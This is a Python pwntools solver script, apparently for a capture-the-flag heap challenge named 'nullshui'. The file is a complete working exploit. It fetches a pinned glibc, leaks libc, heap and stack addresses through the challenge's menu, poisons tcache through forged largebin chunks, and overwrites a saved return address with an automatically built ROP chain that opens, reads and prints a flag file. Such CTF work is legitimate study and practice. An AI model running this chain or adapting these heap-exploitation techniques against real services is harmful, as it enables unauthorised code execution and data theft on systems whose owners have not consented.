#!/usr/bin/env python3
"""
OmniCTF nullshui solver.

Accepted endpoint forms:
    python3 nullshui_solver.py ncat --ssl HOST PORT
    python3 nullshui_solver.py HOST PORT
    python3 nullshui_solver.py --local --binary ./main ...

This deterministic version derives the live stack target from __libc_argv and the exact libc startup machine code.

The default libc profile matches the handout's pinned Ubuntu image
(ubuntu:noble-20260509.1): libc6 2.39-0ubuntu8.7.  On first use the script
caches the official libc6 and libc6-dbg packages so it can resolve
main_arena, exported symbols, and ROP gadgets without hard-coded gadget
addresses.
"""

from __future__ import annotations

import argparse
import hashlib
import io as pyio
import os
from pathlib import Path
import re
import shutil
import struct
import sys
import tarfile
import tempfile
import urllib.request

try:
    from pwn import ELF, ROP, context, log, p64, process, remote
except ImportError as exc:
    raise SystemExit(
        "pwntools is required: python3 -m pip install --user pwntools"
    ) from exc

context.clear(arch="amd64", os="linux")

DEFAULT_GLIBC_VERSION = "2.39-0ubuntu8.7"
DEFAULT_PACKAGE_ROOT = "https://security.ubuntu.com/ubuntu/pool/main/g/glibc"
DEFAULT_LIBC_SHA256 = "955644e8bc2930a9bf8eea5e4c2237c8a118c1e2ac2845b993b6f7f35eefd293"

# malloc_state geometry for amd64 glibc 2.39:
# largebin_index_64(0x510) == 68
# bin_at(main_arena, 68) == main_arena + 0x490
LARGEBIN_0X510_HEAD_FROM_MAIN_ARENA = 0x490

MREQ = 0x928
P_HEADER_FROM_L_USER = 0x410
FAKE_TCACHE_SIZE = 0x411  # request 0x400 -> chunk size 0x410
FLAG_RE = re.compile(rb"(?:omniCTF|OMNICTF|OmniCTF)\{[^}\r\n]+\}")


def parse_int(value: str) -> int:
    return int(value, 0)


def qword(data: bytes) -> int:
    return int.from_bytes(data[:8].ljust(8, b"\0"), "little")


def extract_six_byte_leak(output: bytes, marker: bytes, label: str) -> int:
    position = output.find(marker)
    if position < 0:
        raise RuntimeError(f"{label}: marker was not returned by view")
    raw = output[position + len(marker) : position + len(marker) + 6]
    if len(raw) != 6:
        raise RuntimeError(f"{label}: received only {len(raw)} leak bytes")
    return qword(raw)


def download(url: str, destination: Path, expected_sha256: str | None = None) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    temporary = destination.with_suffix(destination.suffix + ".part")
    log.info(f"downloading {destination.name}")
    request = urllib.request.Request(url, headers={"User-Agent": "nullshui-solver/1.0"})
    try:
        with urllib.request.urlopen(request, timeout=60) as response, temporary.open("wb") as out:
            digest = hashlib.sha256()
            while True:
                block = response.read(1024 * 1024)
                if not block:
                    break
                out.write(block)
                digest.update(block)
    except Exception:
        temporary.unlink(missing_ok=True)
        raise

    actual = digest.hexdigest()
    if expected_sha256 and actual.lower() != expected_sha256.lower():
        temporary.unlink(missing_ok=True)
        raise RuntimeError(
            f"checksum mismatch for {destination.name}: {actual} != {expected_sha256}"
        )
    temporary.replace(destination)


def read_ar_members(path: Path) -> dict[str, bytes]:
    data = path.read_bytes()
    if not data.startswith(b"!<arch>\n"):
        raise RuntimeError(f"{path} is not a Debian/ar archive")
    members: dict[str, bytes] = {}
    offset = 8
    while offset + 60 <= len(data):
        header = data[offset : offset + 60]
        offset += 60
        if header[58:60] != b"`\n":
            raise RuntimeError(f"malformed ar header in {path}")
        name = header[:16].decode("ascii", "replace").strip().rstrip("/")
        size = int(header[48:58].decode("ascii").strip())
        body = data[offset : offset + size]
        members[name] = body
        offset += size + (size & 1)
    return members


def safe_extract_tar(archive: tarfile.TarFile, destination: Path) -> None:
    root = destination.resolve()
    for member in archive:
        target = (destination / member.name).resolve()
        if target != root and root not in target.parents:
            raise RuntimeError(f"unsafe path in package: {member.name}")
        archive.extract(member, destination)


def extract_deb(path: Path, destination: Path) -> None:
    marker = destination / ".extracted"
    if marker.exists():
        return
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True)

    members = read_ar_members(path)
    item = next(((name, body) for name, body in members.items() if name.startswith("data.tar")), None)
    if item is None:
        raise RuntimeError(f"no data.tar member in {path}")
    name, body = item

    if name.endswith(".zst"):
        try:
            import zstandard
        except ImportError as exc:
            raise RuntimeError(
                "zstandard is required to unpack Ubuntu .deb files: "
                "python3 -m pip install --user zstandard"
            ) from exc
        reader = zstandard.ZstdDecompressor().stream_reader(pyio.BytesIO(body))
        decompressed_body = reader.read()
        with tarfile.open(fileobj=pyio.BytesIO(decompressed_body), mode="r:*") as archive:
            safe_extract_tar(archive, destination)
    else:
        with tarfile.open(fileobj=pyio.BytesIO(body), mode="r:*") as archive:
            safe_extract_tar(archive, destination)
    marker.touch()


def find_one(root: Path, name: str) -> Path:
    matches = [p for p in root.rglob(name) if p.is_file()]
    if not matches:
        raise RuntimeError(f"could not find {name} under {root}")
    # Prefer the native amd64 library rather than any compatibility copy.
    matches.sort(key=lambda p: ("x86_64-linux-gnu" not in str(p), len(str(p))))
    return matches[0]


def resolve_default_libc(version: str, package_root: str) -> tuple[Path, Path]:
    cache = Path(os.environ.get("XDG_CACHE_HOME", Path.home() / ".cache")) / "nullshui" / version
    libc_deb = cache / f"libc6_{version}_amd64.deb"
    debug_deb = cache / f"libc6-dbg_{version}_amd64.deb"
    libc_root = cache / "libc-root"
    debug_root = cache / "debug-root"

    if not libc_deb.exists():
        checksum = DEFAULT_LIBC_SHA256 if version == DEFAULT_GLIBC_VERSION else None
        download(f"{package_root}/{libc_deb.name}", libc_deb, checksum)
    if not debug_deb.exists():
        download(f"{package_root}/{debug_deb.name}", debug_deb)

    extract_deb(libc_deb, libc_root)
    extract_deb(debug_deb, debug_root)
    libc_path = find_one(libc_root, "libc.so.6")

    libc = ELF(str(libc_path), checksec=False)
    if not libc.buildid:
        raise RuntimeError("downloaded libc has no GNU build ID")
    build_id = libc.buildid.hex()
    debug_path = debug_root / "usr" / "lib" / "debug" / ".build-id" / build_id[:2] / f"{build_id[2:]}.debug"
    if not debug_path.is_file():
        # Package layouts occasionally include an extra leading /lib or /usr/lib.
        candidates = list(debug_root.rglob(f"{build_id[2:]}.debug"))
        if not candidates:
            raise RuntimeError(f"matching libc debug image was not found for build ID {build_id}")
        debug_path = candidates[0]
    return libc_path, debug_path


def resolve_main_arena(libc: ELF, debug_path: Path | None, override: int | None) -> int:
    if override is not None:
        return override
    direct = libc.symbols.get("main_arena")
    if direct is not None:
        return direct
    if debug_path is None:
        raise RuntimeError(
            "main_arena is stripped; supply --libc-debug or --main-arena-offset"
        )
    debug = ELF(str(debug_path), checksec=False)
    arena = debug.symbols.get("main_arena")
    if arena is None:
        raise RuntimeError(f"main_arena is absent from {debug_path}")
    return arena


def resolve_hidden_symbol(debug_path: Path, exact_name: str) -> int:
    """Resolve a hidden/local libc symbol from the detached debug ELF."""
    debug = ELF(str(debug_path), checksec=False)
    direct = debug.symbols.get(exact_name)
    if direct is not None:
        return direct

    matches = [
        (name, value)
        for name, value in debug.symbols.items()
        if name.startswith(exact_name + ".")
    ]
    if matches:
        matches.sort(key=lambda item: (len(item[0]), item[0]))
        return matches[0][1]
    raise RuntimeError(f"{exact_name} is absent from the matching libc debug image")


def _disassemble(libc: ELF, start: int, size: int = 0x300):
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
    except ImportError as exc:
        raise RuntimeError("capstone is required for deterministic startup-frame analysis") from exc
    decoder = Cs(CS_ARCH_X86, CS_MODE_64)
    decoder.detail = True
    return list(decoder.disasm(libc.read(start, size), start))


def _rsp_frame_adjustment(instruction) -> int:
    """Return positive bytes reserved on the stack by one instruction."""
    if instruction.mnemonic == "push":
        return 8
    if instruction.mnemonic == "pop":
        return -8
    if instruction.mnemonic in {"sub", "add"} and instruction.op_str.startswith("rsp, "):
        try:
            amount = int(instruction.op_str.split(",", 1)[1].strip(), 0)
        except ValueError:
            return 0
        return amount if instruction.mnemonic == "sub" else -amount
    return 0


def _entry_frame_size(libc: ELF, function: int) -> int:
    depth = 0
    for instruction in _disassemble(libc, function):
        if instruction.mnemonic == "call":
            break
        depth += _rsp_frame_adjustment(instruction)
    if depth <= 0 or depth & 7:
        raise RuntimeError(f"invalid startup prologue frame size {depth:#x}")
    return depth


def _call_main_frame_size(libc: ELF, helper: int) -> int:
    try:
        from capstone.x86 import X86_OP_IMM
    except ImportError as exc:
        raise RuntimeError("capstone x86 support is unavailable") from exc

    depth = 0
    for instruction in _disassemble(libc, helper, 0x240):
        if instruction.mnemonic == "call":
            if instruction.operands and instruction.operands[0].type != X86_OP_IMM:
                if depth < 0x80 or depth & 7:
                    raise RuntimeError(
                        f"unexpected __libc_start_call_main frame size {depth:#x}"
                    )
                return depth
        depth += _rsp_frame_adjustment(instruction)
    raise RuntimeError("could not locate the indirect main() call in libc startup code")


def resolve_call_main_helper(libc: ELF, debug_path: Path) -> int:
    """Locate __libc_start_call_main by symbol or exact code shape."""
    try:
        return resolve_hidden_symbol(debug_path, "__libc_start_call_main")
    except RuntimeError:
        pass

    try:
        from capstone.x86 import X86_OP_IMM
    except ImportError as exc:
        raise RuntimeError("capstone x86 support is unavailable") from exc

    start_main = libc.symbols.get("__libc_start_main")
    if start_main is None:
        raise RuntimeError("__libc_start_main is absent from libc")

    def executable(address: int) -> bool:
        for segment in libc.segments:
            header = segment.header
            if not (int(header.p_flags) & 1):
                continue
            begin = int(header.p_vaddr)
            end = begin + int(header.p_memsz)
            if begin <= address < end:
                return True
        return False

    candidates = []
    for instruction in _disassemble(libc, start_main, 0x1C0):
        if instruction.mnemonic != "call" or not instruction.operands:
            continue
        operand = instruction.operands[0]
        if operand.type != X86_OP_IMM:
            continue
        target = int(operand.imm)
        if not executable(target):
            continue
        try:
            frame = _call_main_frame_size(libc, target)
        except RuntimeError:
            continue
        if 0x80 <= frame <= 0x400:
            candidates.append((abs(target - start_main), target, frame))

    if not candidates:
        raise RuntimeError(
            "could not identify __libc_start_call_main from symbols or machine code"
        )
    candidates.sort()
    _, target, frame = candidates[0]
    log.info(
        f"identified stripped __libc_start_call_main at {target:#x} "
        f"(frame {frame:#x})"
    )
    return target


def derive_argv_to_alloc_rbp(libc: ELF, debug_path: Path, override: int | None) -> int:
    """Derive argv -> active alloc rbp from the exact libc machine code."""
    if override is not None:
        if override <= 0 or override & 7:
            raise RuntimeError(f"invalid --argv-to-alloc-offset: {override:#x}")
        return override

    start_main = libc.symbols.get("__libc_start_main")
    if start_main is None:
        raise RuntimeError("__libc_start_main is absent from libc")
    call_main = resolve_call_main_helper(libc, debug_path)

    start_frame = _entry_frame_size(libc, start_main)
    helper_frame = _call_main_frame_size(libc, call_main)
    result = 0x58 + start_frame + helper_frame
    if result & 0xF != 8:
        raise RuntimeError(
            "derived argv-to-alloc-rbp offset has impossible alignment: "
            f"{result:#x} (start={start_frame:#x}, helper={helper_frame:#x})"
        )
    log.info(
        "derived startup frames: "
        f"__libc_start_main={start_frame:#x}, "
        f"__libc_start_call_main={helper_frame:#x}"
    )
    return result


class Challenge:
    def __init__(self, tube):
        self.io = tube
        self.have_prompt = False

    def choose(self, choice: int) -> None:
        if not self.have_prompt:
            self.io.recvuntil(b"> ")
        self.io.sendline(str(choice).encode())
        self.have_prompt = False

    def finish(self) -> bytes:
        output = self.io.recvuntil(b"> ")
        self.have_prompt = True
        return output

    def alloc(self, index: int, size: int, data: bytes) -> None:
        self.choose(1)
        self.io.sendlineafter(b"idx: ", str(index).encode())
        self.io.sendlineafter(b"size: ", str(size).encode())
        self.io.sendafter(b"data: ", data)
        self.finish()

    def begin_alloc(self, index: int, size: int) -> None:
        self.choose(1)
        self.io.sendlineafter(b"idx: ", str(index).encode())
        self.io.sendlineafter(b"size: ", str(size).encode())
        self.io.recvuntil(b"data: ")

    def free(self, index: int) -> None:
        self.choose(2)
        self.io.sendlineafter(b"idx: ", str(index).encode())
        self.finish()

    def view(self, index: int) -> bytes:
        self.choose(3)
        self.io.sendlineafter(b"idx: ", str(index).encode())
        return self.finish()

    def zero_offset(self, byte_offset: int) -> None:
        if byte_offset < 0 or byte_offset % 8:
            raise ValueError(f"invalid zero offset: {byte_offset:#x}")
        self.choose(4)
        self.io.sendlineafter(b"idx: ", str(byte_offset // 8).encode())
        self.finish()


def make_overlap_payload(p_user: int, flag_path: bytes, target: int | None = None) -> bytes:
    # Only bytes through the forged chunk metadata are required.  Keeping this
    # short makes the challenge's one-shot read more reliable over TCP/TLS.
    payload = bytearray(b"Z" * (P_HEADER_FROM_L_USER + 0x20))
    path = flag_path.rstrip(b"\0") + b"\0"
    if len(path) > 0x100:
        raise ValueError("flag path is too long")
    payload[0x100 : 0x100 + len(path)] = path
    payload[P_HEADER_FROM_L_USER : P_HEADER_FROM_L_USER + 8] = p64(0)
    payload[P_HEADER_FROM_L_USER + 8 : P_HEADER_FROM_L_USER + 16] = p64(FAKE_TCACHE_SIZE)
    encoded = 0 if target is None else target ^ (p_user >> 12)
    payload[P_HEADER_FROM_L_USER + 16 : P_HEADER_FROM_L_USER + 24] = p64(encoded)
    payload[P_HEADER_FROM_L_USER + 24 : P_HEADER_FROM_L_USER + 32] = p64(0)
    return bytes(payload)


def find_gadget(rop: ROP, instructions: list[str]) -> int:
    gadget = rop.find_gadget(instructions)
    if gadget is None:
        raise RuntimeError(f"missing libc gadget: {'; '.join(instructions)}")
    return gadget.address


class StackSetter:
    def __init__(self, address: int, insns, regs, move: int):
        self.address = address
        self.insns = list(insns)
        self.regs = list(regs)
        self.move = move


def _setter_candidates(rop: ROP, register: str, forbidden: set[str] | None = None):
    """Return stack-only gadgets which load *register*.

    Extra pops and ``add rsp, N`` are safe because the chain supplies padding.
    ``pop rsp`` is rejected because it would pivot away from the chain.
    """
    forbidden = forbidden or set()
    candidates = []
    for gadget in rop.gadgets.values():
        if not gadget.insns or gadget.insns[-1] != "ret":
            continue
        if f"pop {register}" not in gadget.insns:
            continue

        touched = {item for item in gadget.regs if isinstance(item, str)}
        if touched & forbidden or "rsp" in touched:
            continue

        allowed = True
        for instruction in gadget.insns[:-1]:
            if instruction.startswith("pop "):
                if instruction == "pop rsp":
                    allowed = False
                    break
                continue
            if instruction.startswith("add rsp, "):
                continue
            if instruction in {"nop", "endbr64"}:
                continue
            allowed = False
            break
        if allowed:
            candidates.append(gadget)

    candidates.sort(key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))
    return candidates


def _raw_stack_setters(libc: ELF, register: str, forbidden: set[str] | None = None):
    """Find longer pop/add-rsp/ret gadgets missed by pwntools' gadget cache."""
    forbidden = forbidden or set()
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
    except ImportError:
        return []

    opcode = {"rdi": b"\x5f", "rsi": b"\x5e", "rdx": b"\x5a"}.get(register)
    if opcode is None:
        return []

    image = Path(libc.path).read_bytes()
    decoder = Cs(CS_ARCH_X86, CS_MODE_64)
    found = {}

    for segment in libc.segments:
        header = segment.header
        flags = int(header.p_flags)
        if not (flags & 1):  # PF_X
            continue
        file_offset = int(header.p_offset)
        file_size = int(header.p_filesz)
        virtual_address = int(header.p_vaddr)
        blob = image[file_offset : file_offset + file_size]

        cursor = 0
        while True:
            hit = blob.find(opcode, cursor)
            if hit < 0:
                break
            cursor = hit + 1
            code = blob[hit : hit + 64]
            insns = []
            regs = []
            move = 8  # final ret consumes the next RIP
            valid = False

            for instruction in decoder.disasm(code, virtual_address + hit):
                text = instruction.mnemonic
                if instruction.op_str:
                    text += " " + instruction.op_str

                if instruction.mnemonic == "pop":
                    reg = instruction.op_str
                    if reg == "rsp":
                        break
                    insns.append(text)
                    regs.append(reg)
                    move += 8
                elif instruction.mnemonic == "add" and instruction.op_str.startswith("rsp, "):
                    try:
                        amount = int(instruction.op_str.split(",", 1)[1].strip(), 0)
                    except ValueError:
                        break
                    if amount < 0 or amount % 8:
                        break
                    insns.append(text)
                    regs.append(amount)
                    move += amount
                elif instruction.mnemonic in {"nop", "endbr64"}:
                    insns.append(text)
                elif instruction.mnemonic == "ret" and instruction.op_str == "":
                    insns.append("ret")
                    valid = True
                    break
                else:
                    break

            if not valid or not insns or insns[0] != f"pop {register}":
                continue
            touched = {item for item in regs if isinstance(item, str)}
            if touched & forbidden or "rsp" in touched:
                continue
            runtime_address = libc.address + virtual_address + hit
            found[runtime_address] = StackSetter(runtime_address, insns, regs, move)

    return sorted(found.values(), key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))


def stack_setter_candidates(
    rop: ROP,
    libc: ELF,
    register: str,
    forbidden: set[str] | None = None,
):
    combined = _setter_candidates(rop, register, forbidden)
    seen = {gadget.address for gadget in combined}
    for gadget in _raw_stack_setters(libc, register, forbidden):
        if gadget.address not in seen:
            combined.append(gadget)
            seen.add(gadget.address)
    combined.sort(key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))
    return combined


def choose_argument_setters(
    rop: ROP,
    libc: ELF,
    values: dict[str, int],
    preserve: set[str] | None = None,
):
    """Choose gadgets and an order whose final register values are correct."""
    from itertools import permutations, product

    preserve = preserve or set()
    registers = list(values)
    pools = {}
    for register in registers:
        pool = stack_setter_candidates(rop, libc, register, preserve)
        if not pool:
            blocked = ", ".join(sorted(preserve)) or "none"
            raise RuntimeError(
                f"missing usable pop-{register} libc gadget "
                f"(protected registers: {blocked})"
            )
        pools[register] = pool[:12]

    best = None
    for order in permutations(registers):
        for gadgets in product(*(pools[register] for register in order)):
            valid = True
            for index, register in enumerate(order):
                for later in gadgets[index + 1 :]:
                    touched = {item for item in later.regs if isinstance(item, str)}
                    if register in touched:
                        valid = False
                        break
                if not valid:
                    break
            if not valid:
                continue
            score = (sum(gadget.move for gadget in gadgets), sum(len(g.insns) for g in gadgets))
            if best is None or score < best[0]:
                best = (score, list(zip(order, gadgets)))

    if best is None:
        protected = ", ".join(sorted(preserve)) or "none"
        raise RuntimeError(
            "could not order argument-loading gadgets without clobbering values "
            f"(protected registers: {protected})"
        )
    return best[1]


def build_rop(libc: ELF, path_address: int, buffer_address: int) -> bytes:
    rop = ROP(libc)
    ret = find_gadget(rop, ["ret"])
    chain: list[int] = []

    def append_stack_setter(gadget, register: str, value: int) -> None:
        chain.append(gadget.address)
        assigned = False
        for consumed in gadget.regs:
            if isinstance(consumed, str):
                if consumed == register and not assigned:
                    chain.append(value)
                    assigned = True
                else:
                    chain.append(0)
            else:
                chain.extend([0] * (consumed // context.bytes))
        if not assigned:
            raise RuntimeError(f"internal gadget error: {register} was not consumed")

    def set_arguments(values: dict[str, int], preserve: set[str] | None = None) -> None:
        selected = choose_argument_setters(rop, libc, values, preserve)
        for register, gadget in selected:
            append_stack_setter(gadget, register, values[register])

    def call(function: int) -> None:
        # rbp is 16-byte aligned. A ret-loaded SysV function must start with
        # rsp % 16 == 8, so the function address belongs at an odd qword index.
        if len(chain) % 2 == 0:
            chain.append(ret)
        chain.append(function)

    # open(path, O_RDONLY, 0)
    set_arguments({"rdi": path_address, "rsi": 0, "rdx": 0})
    call(libc.sym["open"])

    # Prefer carrying open()'s actual return value in rdi. If this libc has no
    # rsi/rdx setters that preserve rdi, use the standard first free fd (3).
    xchg_eax_edi = next(libc.search(b"\x97\xc3", executable=True), None)
    dynamic_fd = False
    if xchg_eax_edi is not None:
        try:
            read_setters = choose_argument_setters(
                rop,
                libc,
                {"rsi": buffer_address, "rdx": 0x100},
                {"rdi"},
            )
            chain.append(xchg_eax_edi)
            for register, gadget in read_setters:
                append_stack_setter(gadget, register, {"rsi": buffer_address, "rdx": 0x100}[register])
            dynamic_fd = True
        except RuntimeError:
            pass

    if not dynamic_fd:
        log.warning("using expected flag fd 3; no rdi-preserving read-argument gadget set")
        set_arguments({"rdi": 3, "rsi": buffer_address, "rdx": 0x100})
    call(libc.sym["read"])

    # write(1, buffer, 0x100)
    set_arguments({"rdi": 1, "rsi": buffer_address, "rdx": 0x100})
    call(libc.sym["write"])

    set_arguments({"rdi": 0})
    call(libc.sym["_exit"])
    return b"".join(p64(value) for value in chain)

def exploit(
    tube,
    libc: ELF,
    main_arena_offset: int,
    flag_path: bytes,
    libc_argv_offset: int,
    argv_to_alloc_rbp: int,
) -> bytes:
    c = Challenge(tube)

    # Fixed heap layout.  A and P are later consolidated; G1/G2 guard the two
    # largebin nodes; F1/F2 seed two rounds of 0x410 tcache poisoning.
    c.alloc(0, 0x410, b"A")
    c.alloc(1, 0x500, b"P")
    c.alloc(2, 0x100, b"g")
    c.alloc(3, 0x520, b"Q")
    c.alloc(4, 0x100, b"g")
    c.alloc(7, 0x400, b"f")
    c.alloc(8, 0x400, b"f")

    c.free(1)
    c.free(3)
    c.alloc(5, 0x1000, b"R")  # sort P/Q into largebin 68

    libc_marker = b"C" * 8
    c.alloc(3, 0x520, libc_marker)
    largebin_head = extract_six_byte_leak(c.view(3), libc_marker, "libc leak")
    libc_base = largebin_head - (
        main_arena_offset + LARGEBIN_0X510_HEAD_FROM_MAIN_ARENA
    )
    if libc_base & 0xFFF:
        raise RuntimeError(
            f"libc base is not page aligned ({libc_base:#x}); the libc profile is wrong"
        )
    libc.address = libc_base
    log.success(f"libc base: {libc_base:#x}")

    c.free(3)
    c.alloc(9, 0x600, b"TQ")  # put Q back in the largebin

    heap_marker = b"H" * 16
    c.alloc(1, 0x500, heap_marker)
    q_header = extract_six_byte_leak(c.view(1), heap_marker, "heap leak")
    heap_base = q_header - 0xCD0
    if heap_base & 0xFFF:
        raise RuntimeError(f"heap base is not page aligned ({heap_base:#x})")
    log.success(f"heap base: {heap_base:#x}")

    c.free(1)
    c.alloc(10, 0x600, b"TP")  # put P back in the largebin

    p_user = heap_base + 0x6C0
    p_header = p_user - 0x10
    l_user = heap_base + 0x2A0

    # Null P.fd_nextsize.  The first allocation unlinks P from the ordinary
    # list but leaves Q's size-sorted pointer stale.  Re-forging P as a
    # self-linked node makes the second same-size allocation return P again.
    c.zero_offset((p_user + 0x10) - heap_base)
    c.alloc(1, 0x500, p64(p_header) * 4 + b"P1")
    c.alloc(6, 0x500, b"P2")

    # Keep slot 6 dangling while A+P becomes one 0x930 unsorted chunk.
    c.free(1)
    c.free(0)
    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path))

    # Round 1: leak libc's hidden __libc_argv pointer. This identifies the
    # initial process stack directly and does not depend on argc or socat's
    # EXEC argument layout.
    c.free(7)
    c.free(6)
    c.free(0)
    argv_global = libc.address + libc_argv_offset
    argv_leak_target = (argv_global - 0x10) & ~0xF
    argv_prefix_length = argv_global - argv_leak_target
    if argv_prefix_length < 0x10 or argv_prefix_length > 0x1F:
        raise RuntimeError("internal __libc_argv leak alignment error")
    argv_marker = b"V" * argv_prefix_length

    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path, argv_leak_target))
    c.alloc(6, 0x400, b"X")
    c.alloc(7, 0x400, argv_marker)
    stack_argv = extract_six_byte_leak(c.view(7), argv_marker, "argv stack leak")
    if not (0x700000000000 <= stack_argv < 0x800000000000):
        raise RuntimeError(f"invalid stack argv pointer: {stack_argv:#x}")
    log.success(f"stack argv: {stack_argv:#x}")

    target_rbp = stack_argv - argv_to_alloc_rbp
    if target_rbp & 0xF:
        raise RuntimeError(f"calculated alloc rbp is not 16-byte aligned ({target_rbp:#x})")
    log.success(
        f"exact alloc rbp: {target_rbp:#x} "
        f"(argv - {argv_to_alloc_rbp:#x})"
    )

    rop_bytes = build_rop(libc, l_user + 0x100, l_user + 0x200)
    final_data = p64(0) + rop_bytes  # replacement saved rbp, then saved RIP/ROP
    if len(final_data) > 0x400:
        raise RuntimeError(f"ROP chain is too large ({len(final_data):#x})")

    # Round 2: poison the same fake tcache node to the active alloc frame's rbp.
    c.free(8)
    c.free(6)
    c.free(0)
    c.alloc(0, MREQ, make_overlap_payload(p_user, flag_path, target_rbp))
    c.alloc(6, 0x400, b"Y")
    c.begin_alloc(11, 0x400)
    tube.send(final_data)
    return tube.recvall(timeout=8)


def parse_endpoint(tokens: list[str], local: bool) -> tuple[str | None, int | None]:
    cleaned = list(tokens)
    if cleaned and cleaned[0] in {"ncat", "nc", "netcat"}:
        cleaned.pop(0)
    # argparse consumes --ssl/--no-ssl, but tolerate copied ncat flags left in REMAINDER.
    cleaned = [token for token in cleaned if token not in {"--ssl", "-v", "-n"}]
    if local:
        if cleaned:
            raise SystemExit("endpoint arguments are not used with --local")
        return None, None
    if len(cleaned) != 2:
        raise SystemExit(
            "usage: nullshui_solver.py ncat --ssl HOST PORT\n"
            "   or: nullshui_solver.py HOST PORT"
        )
    try:
        port = int(cleaned[1], 10)
    except ValueError as exc:
        raise SystemExit(f"invalid port: {cleaned[1]}") from exc
    return cleaned[0], port


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="solver for OmniCTF nullshui")
    parser.add_argument("endpoint", nargs="*", help="[ncat] HOST PORT")
    parser.add_argument("--ssl", dest="ssl", action="store_true", default=True)
    parser.add_argument("--no-ssl", dest="ssl", action="store_false")
    parser.add_argument("--local", action="store_true", help="run the supplied binary locally")
    parser.add_argument("--binary", default="./main", help="local challenge binary")
    parser.add_argument("--libc", type=Path, help="exact libc.so.6")
    parser.add_argument("--libc-debug", type=Path, help="matching libc detached debug ELF")
    parser.add_argument("--main-arena-offset", type=parse_int, help="override main_arena offset")
    parser.add_argument(
        "--argv-to-alloc-offset",
        type=parse_int,
        help="override the offset derived from the exact libc startup machine code",
    )
    parser.add_argument("--glibc-version", default=DEFAULT_GLIBC_VERSION)
    parser.add_argument("--package-root", default=DEFAULT_PACKAGE_ROOT)
    parser.add_argument("--flag-path", default="/home/ctf/flag.txt")
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--debug", action="store_true", help="enable pwntools debug logging")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_intermixed_args()
    context.log_level = "debug" if args.debug else "info"
    context.timeout = args.timeout
    host, port = parse_endpoint(args.endpoint, args.local)

    debug_path = args.libc_debug
    if args.libc is None:
        libc_path, auto_debug = resolve_default_libc(args.glibc_version, args.package_root.rstrip("/"))
        if debug_path is None:
            debug_path = auto_debug
    else:
        libc_path = args.libc.expanduser().resolve()
    if not libc_path.is_file():
        raise SystemExit(f"libc not found: {libc_path}")
    if debug_path is not None:
        debug_path = debug_path.expanduser().resolve()
        if not debug_path.is_file():
            raise SystemExit(f"libc debug image not found: {debug_path}")

    libc = ELF(str(libc_path), checksec=False)
    arena = resolve_main_arena(libc, debug_path, args.main_arena_offset)
    if debug_path is None:
        raise SystemExit("the deterministic solver requires the matching libc debug image")
    libc_argv_offset = resolve_hidden_symbol(debug_path, "__libc_argv")
    argv_to_alloc_rbp = derive_argv_to_alloc_rbp(
        libc,
        debug_path,
        args.argv_to_alloc_offset,
    )
    log.info(f"libc: {libc_path}")
    log.info(f"main_arena offset: {arena:#x}")
    log.info(f"__libc_argv offset: {libc_argv_offset:#x}")
    log.info(f"argv-to-active-alloc-rbp: {argv_to_alloc_rbp:#x}")

    if args.local:
        binary = Path(args.binary).expanduser().resolve()
        if not binary.is_file():
            raise SystemExit(f"binary not found: {binary}")
        tube = process([str(binary)])
    else:
        assert host is not None and port is not None
        log.info(f"connecting to {host}:{port} (ssl={args.ssl})")
        tube = remote(host, port, ssl=args.ssl, sni=host if args.ssl else None)

    try:
        output = exploit(
            tube,
            libc,
            arena,
            args.flag_path.encode(),
            libc_argv_offset,
            argv_to_alloc_rbp,
        )
    finally:
        tube.close()

    match = FLAG_RE.search(output)
    if match:
        log.success(match.group().decode("ascii", "replace"))
        return 0

    sys.stdout.buffer.write(output)
    if output and not output.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    log.failure("the ROP chain ran, but no omniCTF flag was found in the output")
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except Exception as exc:
        log.failure(str(exc))
        if context.log_level == "debug":
            raise
        raise SystemExit(1)
